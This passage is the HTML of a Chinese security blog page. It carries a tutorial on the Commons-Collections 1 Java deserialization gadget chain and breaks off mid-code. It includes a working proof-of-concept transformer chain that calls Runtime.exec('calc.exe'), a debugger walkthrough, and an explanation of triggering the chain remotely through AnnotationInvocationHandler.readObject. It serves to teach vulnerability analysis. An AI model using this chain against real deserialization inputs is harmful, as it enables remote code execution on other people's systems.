<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">commons-collection1利用链分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-06-03 09:55:52" itemprop="dateCreated datePublished" datetime="2021-06-03T09:55:52+08:00">2021-06-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-06-10 13:49:17" itemprop="dateModified" datetime="2021-06-10T13:49:17+08:00">2021-06-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="1-序列化-与-反序列化"><a href="#1-序列化-与-反序列化" class="headerlink" title="1. 序列化 与 反序列化"></a>1. <strong>序列化 与 反序列化</strong></h4><ul>
<li><p><strong>定义</strong>：<strong><u>序列化</u></strong>指 将 <strong><u>对象/数据结构</u></strong>的<u><strong>状态</strong></u>信息 转换为可以<u><strong>存储</strong></u>或<u><strong>传输</strong></u>的形式的过程，其<u><strong>反</strong></u>过程称为<u><strong>反序列化</strong></u>。</p>
</li>
<li><p><strong>作用</strong>：</p>
<ul>
<li>将对象<u><strong>持久化</strong></u>到<u><strong>存储介质</strong></u>以便再次使用</li>
<li>使对象能在<u><strong>网络</strong></u>中传输</li>
<li>如序列化格式<u><strong>独立于语言</strong></u>，可以实现<u><strong>不同语言</strong></u>之间<u><strong>对象的传递</strong></u></li>
</ul>
</li>
<li><p><strong>常见形式</strong>：</p>
<ul>
<li>标准化格式：<ul>
<li>独立于语言/平台的格式：<ul>
<li>文本格式：xml，json等</li>
<li>二进制格式：protobuf等</li>
</ul>
</li>
<li>特定语言规定的格式：各类编程语言自带序列化格式（如java，python）</li>
</ul>
</li>
<li>私有格式：。。。</li>
</ul>
</li>
<li><p><strong>安全性思考</strong>：</p>
<ul>
<li><p>一切安全问题都产生于输入，这里的输入就是攻击端序列化好后的对象，被攻击端反序列化该对象。</p>
</li>
<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，序列化的对象<u><strong>仅可以包含属性</strong></u>，而<u><strong>不可以包含方法</strong></u>，所以<strong><u>不可能</u></strong>在序列化的过程中<strong><u>写入</u></strong>我们<strong><u>自己的代码</u></strong>，<strong><u>仅能控制</u></strong>对象的<strong><u>属性</u></strong>。</p>
<p><strong>ps.</strong> 反序列化端进程空间<strong><u>必须持有</u></strong>对象的<strong><u>类型信息和代码</u></strong>，否则无法正常的使用对象(如调用对象的方法)。</p>
</li>
<li><p>被攻击端反序列化该对象的<strong><u>过程中</u></strong>或者反序列化该对象<strong><u>之后</u></strong>执行了<strong><u>依赖该对象</u></strong>的代码，我们就可以一定程度<strong><u>通过</u></strong>对象的<strong><u>属性</u></strong>影响被攻击端程序的运行逻辑。</p>
</li>
<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，在对象反序列化的<strong><u>过程中</u></strong>，都会调用 默认的或该对象自定义的反序列化处理方法（如java中的ObjectInputStream.readObject 或 对象自定义的obj.readObject），所以反序列化漏洞大多出现在对象反序列化的<u><strong>过程中</strong></u>。</p>
</li>
</ul>
</li>
</ul>
<h4 id="2-common-collection-1利用链分析"><a href="#2-common-collection-1利用链分析" class="headerlink" title="2. common-collection-1利用链分析"></a>2. common-collection-1利用链分析</h4><blockquote>
<ul>
<li><p>The <a href="http://docs.oracle.com/javase/tutorial/collections/" target="_blank" rel="noopener">Java Collections Framework</a> was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</p>
<p>java collection 框架是jdk1.2 的主要补充，其增加了许多强大的数据结构，加速了大多数重要的java应用的开发。自那时起，它已经成为java处理集合的事实上的标准。</p>
</li>
<li><p><a href="https://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener">Commons-Collections</a> seek to build upon the JDK classes by providing new interfaces, implementations and utilities.</p>
<p>Common-Collections 通过提供新的接口，实现和工具(类)扩展了jdk 中java collection的功能。</p>
</li>
</ul>
</blockquote>
<p>漏洞分析环境：jdk1.7  ， commons-collections-3.1，Intellij IDEA</p>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc_1"></a>poc_1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到TransformedMap的一个Entry</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry)outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//设置TransformedMap的Entry时会通过Transformer链对Value进行转换，转换过程依次执行Transformer链中的Transformer.transform方法，触发代码执行。</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>poc_1  第34行打断点，运行(f9)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366778178-1623304151021.png" alt="1622366778178"></p>
</li>
<li><p>step into (f7)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366849023-1623304151021.png" alt="1622366849023"></p>
</li>
<li><p>step into (f7)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366888331-1623304151022.png" alt="1622366888331"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622367177772-1623304151022.png" alt="1622367177772"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622366950973-1623304151022.png" alt="1622366950973"></p>
<p>valueTransformer类型为ChainedTransformer，其中包含1个ConstantTransformer，3个InvokerTransformer。然后调用了valueTransformer.transform对传入对象进行转换。</p>
</li>
<li><p>step into (f7)，第59行打断点</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368649810-1623304151022.png" alt="1622368649810"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622367738856-1623304151022.png" alt="1622367738856"></p>
<p>ChainedTransformer的iTransformers是一个Transformer数组，维护了其Transformer链。ChainedTransformer使用其维护的Transformer链上的Transformer依次对对象进行转换。每个Transformer.transform输入一个对象并返回转换后的对象，转换后的对象传给下一个Transformer直到所有Transformer处理完毕。</p>
</li>
<li><p>step into * 2 (f7 两次)，进入第一个Transformer(ConstantTransformer)的实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368399429-1623304151023.png" alt="1622368399429"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622368422967-1623304151023.png" alt="1622368422967"></p>
<p>返回java.lang.Runtime的class对象</p>
</li>
<li><p>运行(f9)，断在ChainedTransformer.transform的循环中</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370300500-1623304151023.png" alt="1622370300500"></p>
</li>
<li><p>step into(f7)，进入第二个Transformer(InvokerTransformer)的实现，运行到第61行(alt+f9)</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622372409077-1623304151023.png" alt="1622372409077"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370571481-1623304151023.png" alt="1622370571481"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622370687827-1623304151023.png" alt="1622370687827"></p>
<p>此Transformer输入对象是java.lang.Runtime类的class对象，调用class对象的getMethod方法获取到java.lang.Runtime.getRuntime方法，返回其Method对象。</p>
</li>
<li><p>61行打断点(由poc知，后续所有的Transformer都是InvokerTransformer)，f9两次，进入第三个Transformer(InvokerTransformer)实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622427469533-1623304151023.png" alt="1622427469533"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622427399455-1623304151023.png" alt="1622427399455"></p>
<p>此Transformer输入对象是java.lang.Runtime.getRuntime方法的Method的对象，调用Method对象的invoke方法得到Runtime对象，返回Runtime对象。</p>
</li>
<li><p>f9两次，进入第四个Transformer(InvokerTransformer)实现</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428774757-1623304151023.png" alt="1622428774757"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428798070-1623304151023.png" alt="1622428798070"></p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622428812562-1623304151023.png" alt="1622428812562"></p>
<p>此Transformer输入对象是Runtime对象，调用Runtime对象的exec方法弹出计算器。</p>
</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li><p>TransformedMap对Map进行了增强，可以通过设置针对key/value的Transformer对将要存入Map的key/value对象进行转换。</p>
</li>
<li><p>Transformer是个接口，调用Transformer.transform方法可以对对象进行转换(传入要转换的对象，返回转换后的对象)，这里只关注其以下三种实现(<strong>三种实现均支持序列化!!!</strong>)</p>
<ul>
<li><p>ConstantTransformer，无论要转换的对象是什么，都返回一个<strong><u>固定</u></strong>的转换后的对象。</p>
</li>
<li><p>InvokerTransformer，<strong><u>调用</u></strong>要转换对象的一个<strong><u>成员方法</u></strong>，该成员方法返回转换后的对象。</p>
</li>
<li><p>ChainedTransformer，可以接受一个Transformer数组生成一个<strong><u>转换链</u></strong>。<strong><u>依次调用</u></strong>每个Transformer的transform方法对对象进行处理，<strong><u>前一个</u></strong>Transformer的<strong><u>输出对象</u></strong>作为<strong><u>后一个</u></strong>Transformer的<strong><u>输入</u></strong>。可以用ConstantTransformer初始化要转换的对象。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>如果想要<strong><u>调用</u></strong>一个<strong><u>对象的方法</u></strong>，可以定义一个ChainedTransformer。用ConstantTransformer<strong><u>初始化</u></strong>要转换的<strong><u>对象</u></strong>，用InvokerTransformer<strong><u>调用</u></strong>要转换<strong><u>对象的方法</u></strong>。定义ChainedTransformer<strong><u>只是定义</u></strong>了一个<strong><u>对象</u></strong>，其<strong><u>转换逻辑只有在</u></strong>TransformedMap 的<strong><u>key/value值被初始化或改变</u></strong>的时候才会<strong><u>触发</u></strong>(如poc_1对TransformedMap第一个Entry调用setValue方法触发转换逻辑)。</li>
</ul>
<h4 id="3-让目标程序执行恶意逻辑"><a href="#3-让目标程序执行恶意逻辑" class="headerlink" title="3. 让目标程序执行恶意逻辑"></a>3. 让目标程序执行恶意逻辑</h4><h5 id="能否在目标机运行poc-1中的恶意转换逻辑"><a href="#能否在目标机运行poc-1中的恶意转换逻辑" class="headerlink" title="能否在目标机运行poc_1中的恶意转换逻辑?"></a>能否在目标机运行poc_1中的恶意转换逻辑?</h5><ul>
<li><p>需要找一个合适的<strong><u>输入点</u></strong>，将poc_1中代码插入目标程序</p>
<p>但是<strong><u>一般</u></strong>情况下，<strong><u>很难有</u></strong>一个<strong><u>输入点</u></strong>可以让我们将自己的<strong><u>代码插入</u></strong>。即使有也不够通用，往往是一个命令执行的漏洞，如有一个groovy(groovy兼容java语法)命令执行的输入点(但都有命令执行了还看个泡泡茶壶=_=!)。</p>
</li>
<li><p>所以<strong><u>只能利用</u></strong>程序中<strong><u>已加载</u></strong>的<strong><u>代码</u></strong>，通过<strong><u>控制代码关联的数据间接控制</u></strong>代码的<strong><u>执行逻辑</u></strong></p>
<p>对java这种面向对象的语言来说，控制对象的<strong><u>属性</u></strong>就可以影响其方法的执行逻辑。有什么<strong><u>输入点</u></strong>可以比较方便的<strong><u>控制</u></strong>对象的<strong><u>属性</u></strong>？显然，反序列化（反序列化可以完全控制对象的属性，其他输入方式大多只能控制属性的一小部分字段）。如果目标程序存在反序列化输入点，我们就可以构造序列化好的对象发送给目标程序。</p>
</li>
<li><p>目标<strong><u>何时调用</u></strong>被反序列化的<strong><u>对象关联的代码</u></strong>?</p>
<ul>
<li><p>如果该对象的类<strong><u>重写</u></strong>了readObject方法，<strong><u>反序列化</u></strong>该对象的<strong><u>过程中会调用</u></strong>该对象的readObject方法。</p>
</li>
<li><p>反序列化对象<strong><u>以后</u></strong>，程序可能会使用反序列化后的对象，也<strong><u>可能</u></strong>调用其方法。</p>
</li>
</ul>
<p>显然，前种情况<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>更加<strong><u>稳定</u></strong>(反序列化<strong><u>过程中</u></strong>readObject<strong><u>必然被调用</u></strong>到)，后者<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>则非常<strong><u>依赖</u></strong>程序对反序列化后对象的<strong><u>使用的策略</u></strong>(例如：可能先将反序列化后的对象维护到一个全局数据结构，很久以后才用)。所以我们优先考虑第一种情况。</p>
</li>
<li><p>整理一下</p>
<p>攻击端序列化一个对象发送给目标程序，目标程序反序列化过程中调用此对象的readObject方法，readObject触发恶意逻辑。</p>
<p>由于readObject是目标程序定义的方法，我们无法修改，所以触发恶意逻辑的代码必须要尽可能的短，否则很难找到合适的反序列化输入点。</p>
<p>好在common-collection1链的触发逻辑就非常短，（例如对绑定了恶意ChainedTransformer的TransformedMap调用put方法，或对TransformedMap的Entry调用setValue方法等）。</p>
<p>因此，我们需要找一个<strong><u>漏洞触发类</u></strong>满足这样的条件：</p>
<ul>
<li>类在目标程序的代码空间里，且类可以序列化</li>
</ul>
</li>
</ul>
<ul>
<li><p>类中包含一个Map类型的属性，我们将其赋值为绑定了恶意ChainedTransformer的TransformedMap。</p>
<ul>
<li>其实现了readObject，readObject对Map属性（Map是一个接口，现在指向恶意TransformedMap）的key/value进行了更新(触发恶意逻辑)</li>
</ul>
<p>于是，<strong><u>攻击流程</u></strong>是这样（代码见poc_2，poc_2中漏洞触发类是AnnotationInvocationHandler）：</p>
<ul>
<li>攻击者实例化一个<strong><u>漏洞触发类</u></strong>的对象，将map字段填充为<strong><u>绑定了恶意</u></strong>ChainedTransformer的TransformedMap对象。序列化并发送给目标机。</li>
<li>目标收到并反序列化<strong><u>漏洞触发对象</u></strong>，调用readObject方法，对map字段的key/value进行更新，触发恶意的ChainedTransformer的转换逻辑，执行恶意代码。</li>
</ul>
<p>于是关键就是要找一个<strong><u>漏洞触发类</u></strong>，好在有巨佬(orz)已经找到了满足上述条件的类。</p>
</li>
</ul>
<h5 id="漏洞触发类AnnotationInvocationHandler"><a href="#漏洞触发类AnnotationInvocationHandler" class="headerlink" title="漏洞触发类AnnotationInvocationHandler"></a>漏洞触发类AnnotationInvocationHandler</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//poc_2中使用的漏洞触发类</span></span><br><span class="line"><span class="comment">//满足我们之前提到的漏洞触发类须满足的3个条件 1. 2. 3</span></span><br><span class="line"><span class="comment">//类的构造需要满足另外的条件(1)(2)...(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.此类在jdk中，必然会被加载，可序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="comment">//2.含有一个Map类型的属性，可以用构造方法对其赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="comment">//(1)var1.isAnnotation(): 传入的var1是注解的class对象</span></span><br><span class="line">        <span class="comment">//(2)var3.length == 1: 该注解只实现了一个接口</span></span><br><span class="line">        <span class="comment">//(3)var3[0] == Annotation.class: 该注解了实现java.lang.annotation.Annotation接口</span></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//将传入的注解的class对象赋值给this.type</span></span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="comment">//将传入的TransformedMap赋值给this.memberValues</span></span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取传入注解关联的AnnotationType实例</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//通过AnnotationType实例获取注解接口信息。注解接口信息是Map类型，key是注解接口中的方法名，value是该方法的返回类型</span></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//迭代获取传入的TransformedMap的Entry</span></span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            <span class="comment">//获取Entry的key</span></span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            <span class="comment">//通过Entry中的key在注解接口信息中获取注解接口中对应方法的返回类型</span></span><br><span class="line">            <span class="comment">//(4)Entry中的key必须也可以作为注解接口信息的key，即Entry的key必须等于注解接口的任一方法名（例如传入Target.class对象，那么TransformedMap的key必须是"value"）</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//获取Entry的value</span></span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="comment">//(5)Entry的value不是拿到注解接口信息中对应方法的返回类型的实例</span></span><br><span class="line">                <span class="comment">//(6)Entry的value不是ExceptionProxy实例</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//3.实现了readObject方法，并在readObject方法中调用了对map value的更新方法，触发恶意转换逻辑</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                